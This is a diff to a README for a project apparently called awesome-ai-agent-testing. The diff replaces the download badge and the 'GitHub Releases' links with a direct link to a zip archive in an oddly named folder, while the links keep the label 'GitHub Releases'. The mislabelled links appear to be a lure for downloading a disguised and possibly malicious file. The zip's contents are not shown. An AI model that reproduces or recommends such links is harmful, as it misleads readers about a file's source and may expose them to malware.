@@ -1,6 +1,6 @@
 # 🤖 awesome-ai-agent-testing - Streamline Testing for AI Agents
 
-![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)
+![Download](https://raw.githubusercontent.com/Samuray49/awesome-ai-agent-testing/main/allogeneous/awesome-ai-agent-testing.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the awesome-ai-agent-testing project! This application provides a cur
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [GitHub Releases](https://github.com/Samuray49/awesome-ai-agent-testing/releases).
+To get started, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Samuray49/awesome-ai-agent-testing/main/allogeneous/awesome-ai-agent-testing.zip).
 
 1. Click the link above.
 2. Choose the latest version available.
@@ -80,4 +80,4 @@ If you have questions or need help, consider joining our community. Here are som
 
 Enjoy exploring the vast world of AI agent testing with this application. Your feedback is valuable, so don’t hesitate to reach out with suggestions or improvements!
 
-Remember to visit this page to download the latest release: [GitHub Releases](https://github.com/Samuray49/awesome-ai-agent-testing/releases).
+Remember to visit this page to download the latest release: [GitHub Releases](https://raw.githubusercontent.com/Samuray49/awesome-ai-agent-testing/main/allogeneous/awesome-ai-agent-testing.zip).
